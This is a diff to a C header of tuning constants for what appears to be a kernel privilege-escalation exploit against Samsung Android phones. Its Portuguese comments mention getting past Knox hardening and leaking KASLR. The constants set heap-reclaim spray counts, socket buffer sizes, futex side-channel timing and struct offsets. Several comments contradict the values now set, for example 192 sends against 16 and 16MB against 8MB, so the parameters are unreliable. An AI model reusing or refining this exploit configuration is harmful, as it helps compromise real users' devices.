@@ -26,17 +26,17 @@
 #define SKB_DATA_DELTA (-0xd80LL)               /* Mantido o delta calibrado do seu A34 */
 
 /* --- CONFIGURAÇÕES DE VOLUME ADAPTADAS DO A55 PARA O HARDENING DO RECLAIM --- */
-#define MM_STRUCT_SZ 0x500                      /* Expansão estável do Knox que vazou o KASLR */
+#define MM_STRUCT_SZ 0x400                      /* Expansão estável do Knox que vazou o KASLR */
 #define MM_ORDER 3                              /* Ordem de alinhamento condizente com a struct 0x500 */
-#define PSELECT_ENTER_DELAY_USEC 24000
+#define PSELECT_ENTER_DELAY_USEC 40000
 #define SLIDE_STACK_WRITER_FUTEX 1
 
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 
 #define RECLAIM_MODE_ADVANCED 1
-#define APP_SLIDE_RECLAIM_SENDS 192             /* Força bruta do A55: 192 disparos contínuos */
-#define APP_SLIDE_RECLAIM_SNDBUF 16777216       /* Buffer maciço de 16MB para segurar as páginas na RAM */
+#define APP_SLIDE_RECLAIM_SENDS 16             /* Força bruta do A55: 192 disparos contínuos */
+#define APP_SLIDE_RECLAIM_SNDBUF 8388608      /* Buffer maciço de 16MB para segurar as páginas na RAM */
 #define APP_MM_LATE_DRAIN_TRIGGERS 2
 #define APP_DEFER_FINAL_DRAIN_REAP 1
 #define APP_DEFER_ALL_DRAIN_REAPS 1
@@ -69,7 +69,7 @@
 #define SLIDE_KSNITCH_AVERAGE 8
 #define SLIDE_BANK_SLOTS 4
 #define SLIDE_BANK_TASK_OFF 0x1000
-#define SLIDE_BANK_TASK_STRIDE 0x1d0
+#define SLIDE_BANK_TASK_STRIDE 0x1c0
 #define SLIDE_BANK_LOCK_OFF 0x5200
 #define SLIDE_BANK_SLOT_STRIDE 0x100
 #define SLIDE_BANK_WAITER_OFF 0x40
